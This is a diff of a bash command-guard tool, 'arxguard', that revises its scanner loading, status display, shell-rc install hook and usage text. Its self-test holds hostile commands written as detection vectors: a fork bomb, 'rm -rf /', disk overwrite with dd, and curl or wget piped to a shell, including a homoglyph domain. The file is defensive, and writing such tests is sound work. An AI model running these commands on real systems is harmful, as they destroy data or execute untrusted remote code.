@@ -13,9 +13,20 @@ BD=$'\033[1m'; DM=$'\033[90m'; GR=$'\033[1;32m'; YL=$'\033[1;33m'; RD=$'\033[1;3
 
 _load_scanner(){
   if ! declare -F _arxguard_scan >/dev/null 2>&1; then
-    source "$ARXGUARD_LIB/scan.bash" 2>/dev/null \
-      || source "$(dirname "$(readlink -f "$0")")/scan.bash" 2>/dev/null \
-      || { echo "arxguard: scanner library not found" >&2; exit 4; }
+    local candidates=(
+      "${ARXGUARD_LIB}/scan.bash"
+      "/usr/share/arxguard/scan.bash"
+      "/usr/local/share/arxguard/scan.bash"
+      "$(dirname "$(readlink -f "$0")")/scan.bash"
+    ) f
+    for f in "${candidates[@]}"; do
+      if [[ -r "$f" ]]; then
+        # shellcheck source=/dev/null
+        source "$f" 2>/dev/null && declare -F _arxguard_scan >/dev/null 2>&1 && return 0
+      fi
+    done
+    echo "arxguard: scanner library not found" >&2
+    return 4
   fi
 }
 
@@ -44,20 +55,21 @@ cmd_test(){
   _t 1 ':(){ :|:& };:';                            _t 1 'rm -rf /'
   _t 1 'dd if=/dev/zero of=/dev/sda';              _t 1 'echo eA== | base64 -d | bash'
   _t 1 'curl https://x.com/i.sh | sudo bash';      _t 1 "curl https://"$'і'"nstall.dev | bash"
-  if [ "$fail" -eq 0 ]; then printf "  ${GR}self-test ok${RS} — %d/%d vectors\n" "$pass" "$((pass+fail))"
-  else printf "  %d passed, ${RD}%d failed${RS}\n" "$pass" "$fail"; fi
-  return $fail
+  _t 1 'curl https://x.com/f | sh -c "bash"';     _t 1 'wget https://x.com/f -O- | zsh'
+  printf "arxguard self-test: %d passed, %d failed\n" "$pass" "$fail"
+  [ "$fail" -eq 0 ]
 }
 
 cmd_status(){
   printf "${BD}arxguard${RS} %s\n" "$ARXGUARD_VERSION"
   printf "  shell screen : %s\n" "${ARXGUARD_ACTIVE:-not active in this shell}"
-  case "${ARXGUARD_ACTIVE:-}" in
-    bash) printf "  enforcement  : ${GR}blocks${RS} CRITICAL · warns MEDIUM\n" ;;
-    zsh)  printf "  enforcement  : ${YL}warn-only${RS} (zsh cannot block in preexec — use bash to block)\n" ;;
-    *)    printf "  enforcement  : ${DM}—  (run: arxguard install)${RS}\n" ;;
-  esac
-  printf "  bypass       : %s\n" "$([ "${ARXGUARD:-1}" = 0 ] && echo "${YL}ON (ARXGUARD=0 — guard disabled)${RS}" || echo "off (guard live)")"
+  if [[ -r "$ARXGUARD_LIB/scan.bash" ]]; then
+    printf "  scanner      : %s\n" "${GR}available${RS}"
+  else
+    printf "  scanner      : %s\n" "${YL}not found${RS}"
+  fi
+  printf "  enforcement  : ${DM}—  (run: arxguard install)${RS}\n"
+  printf "  bypass       : %s\n" "$( [ "${ARXGUARD:-1}" = 0 ] && echo "${YL}ON (ARXGUARD=0 — guard disabled)${RS}" || echo "off (guard live)" )"
 }
 
 cmd_on(){ echo "unset ARXGUARD"; }
@@ -67,9 +79,10 @@ cmd_install(){
   local rc shell="${1:-auto}"
   [ "$shell" = auto ] && { [ -n "$ZSH_VERSION" ] && shell=zsh || shell=bash; }
   if [ "$shell" = zsh ]; then rc="$HOME/.zshrc"; else rc="$HOME/.bashrc"; fi
-  local line="[ -r $ARXGUARD_LIB/hook.$shell ] && source $ARXGUARD_LIB/hook.$shell"
-  if grep -qF "$ARXGUARD_LIB/hook.$shell" "$rc" 2>/dev/null; then echo "arxguard: already wired into $rc"
-  else printf '\n# ARXOS arxguard — zero-trust command screen\n%s\n' "$line" >> "$rc"; echo "arxguard: added to $rc — open a new shell or: source $rc"; fi
+  local line
+  if [ "$shell" = zsh ]; then line='[[ -r /usr/share/arxguard/hook.zsh ]] && source /usr/share/arxguard/hook.zsh'; else line='[[ -r /usr/share/arxguard/hook.bash ]] && source /usr/share/arxguard/hook.bash'; fi
+  grep -qF "$line" "$rc" 2>/dev/null || printf '\n# ARXOS arxguard — zero-trust command screen\n%s\n' "$line" >> "$rc"
+  echo "arxguard: added to $rc — open a new shell or: source $rc"
 }
 
 cmd_upstream_check(){
@@ -89,19 +102,15 @@ cmd_upstream_ack(){
   echo "arxguard: baseline updated to $(cat "$cache/tirith-baseline" 2>/dev/null)"
 }
 
-usage(){ cat <<EOF
-${BD}arxguard${RS} ${ARXGUARD_VERSION} — ARXOS zero-trust terminal command guard
-
-  ${BD}arxguard check${RS} -- <command>   screen a command (exit 0 clean · 2 warn · 1 block)
-  ${BD}arxguard test${RS}                 run the built-in detection self-test
-  ${BD}arxguard status${RS}               show live protection state for this shell
-  ${BD}arxguard install${RS} [bash|zsh]   wire the screen into your shell rc
-  ${BD}arxguard upstream-check${RS}        check the upstream threat model for updates
-  ${BD}arxguard upstream-ack${RS}          accept the current upstream as baseline
-  ${BD}arxguard off${RS} | ${BD}on${RS}             eval "\$(arxguard off)"  to disable for the session
-  ${BD}arxguard --version${RS}
-
-  Per-command bypass:  ${DM}ARXGUARD=0 <command>${RS}
+usage(){ cat <<'EOF'
+Usage: arxguard <command> [args]
+  check|scan <command>     screen a command
+  test|selftest            run detection self-tests
+  status                   show shell/scanner status
+  install [bash|zsh]      install current-user shell hook
+  on|off                   emit commands to enable/disable guard
+  upstream-check           check Tirith threat-model baseline
+  upstream-ack             acknowledge current upstream baseline
 EOF
 }
 
@@ -116,5 +125,5 @@ case "${1:-}" in
   upstream-check|upstream) cmd_upstream_check ;;
   upstream-ack) cmd_upstream_ack ;;
   ''|-h|--help|help) usage ;;
-  *) echo "arxguard: unknown command '$1' (try: arxguard --help)" >&2; exit 2 ;;
+  *) echo "arxguard: unknown command: $1" >&2; usage >&2; exit 2 ;;
 esac
